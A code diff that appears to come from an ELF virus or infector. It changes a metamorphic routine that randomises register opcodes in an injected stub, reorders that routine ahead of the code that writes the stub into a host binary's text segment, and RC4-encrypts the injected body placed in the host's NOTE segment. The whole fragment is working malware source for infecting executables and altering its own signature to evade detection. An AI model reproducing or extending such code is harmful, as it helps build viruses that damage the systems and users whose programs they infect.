@@ -21,24 +21,24 @@ __attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_P
 	_memcpy(dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE), stub, STUB_SIZE);
 }
 
-__attribute__((always_inline)) static inline void metamorph_stub(char *dst, Elf64_Phdr **segment)
+__attribute__((always_inline)) static inline void metamorph_stub(void)
 {
 	const struct s_metamorph metamorph =
 	{
-		{RAX, RDI, RSI, RDX, RCX},
+		{RBP, RSP, RBX, RAX, RDI, RSI, RDX, RCX},
 		{OFFSET_1, OFFSET_2, OFFSET_3, OFFSET_4, OFFSET_5, OFFSET_6, OFFSET_7, OFFSET_8, OFFSET_9, OFFSET_A},
 	};
 
-	char *stub = dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE);
-	char *ptr = (char *)L1;
+	char *stub;
 	unsigned short opcode;
+	
+	stub = (char *)L1;
 
 	for (register size_t index = 0; index < OFFS_SIZE; index++)
 	{
 		opcode = metamorph.code[_get_random_integer(CODE_SIZE)];
 
 		_memcpy(stub + metamorph.offset[index], &opcode, sizeof(unsigned short));
-		_memcpy(ptr + metamorph.offset[index], &opcode, sizeof(unsigned short));
 	}
 }
 
@@ -59,8 +59,8 @@ void stub(struct s_host *host, struct s_keychain *keychain, enum e_context conte
 
 	const unsigned char key[] = "********";
 
+	metamorph_stub();
 	insert_stub(injection->ptr, host->segment);
-	metamorph_stub(injection->ptr, host->segment);
 
 	RC4(key, DEFAULT_KEY_SIZE, injection->ptr + host->segment[NOTE]->p_offset, ((void *)__exit - (void *)__entry) + FCNT_SIZE);
 
